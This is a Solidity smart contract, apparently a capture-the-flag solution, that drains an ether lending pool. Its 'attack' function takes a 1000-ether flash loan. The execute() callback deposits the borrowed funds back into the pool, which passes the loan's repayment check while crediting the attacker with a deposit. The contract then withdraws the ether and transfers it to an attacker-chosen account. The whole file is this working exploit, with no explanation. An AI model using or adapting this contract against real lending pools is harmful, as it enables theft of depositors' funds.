// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILenderPool{
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}
contract FlashLoanEtherReceiver{
    ILenderPool lender;

    constructor(address _lender){
        lender = ILenderPool(_lender);
    }
    function execute() external payable{
        lender.deposit{value:msg.value}();

    }

    function attack(address payable account) external{
        lender.flashLoan(1000 ether);
        lender.withdraw();
        account.transfer(address(this).balance);
    }

    receive() external payable{}
}